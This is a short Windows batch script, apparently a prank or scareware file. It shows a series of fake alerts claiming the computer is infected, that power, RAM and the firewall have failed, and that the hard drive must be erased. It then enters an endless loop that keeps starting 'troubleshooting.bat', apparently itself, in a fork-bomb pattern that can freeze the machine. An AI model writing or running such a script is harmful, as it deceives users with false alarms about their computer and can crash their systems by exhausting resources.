@echo off
color 02
echo Access Denied! Your Computer is infected
echo -
echo Do not attempt to quit.
PAUSE
echo System check
echo -
echo CHECKING FOR POWER
PAUSE
echo -
echo Power - FAILED
PAUSE
echo -
echo CHECKING FOR RAM
PAUSE
echo -
echo RAM - FAILED
PAUSE
echo -
echo CHECKING FOR ANTIVIRUS UPDATES
PAUSE
echo -
echo UPDATE FAILURE
echo -
PAUSE
echo Breach of IP adress
echo -
echo Firewall - FAILED
echo -
PAUSE
echo Virus attaining: 192.168.XX.X
echo -
echo Hard drive must be erased and rebooted to resume windows.
echo -
PAUSE
echo -
echo Starting to reboot hardrive.
echo -
echo Restart after 10 minutes approximately.
PAUSE
:START
start troubleshooting.bat
GOTO START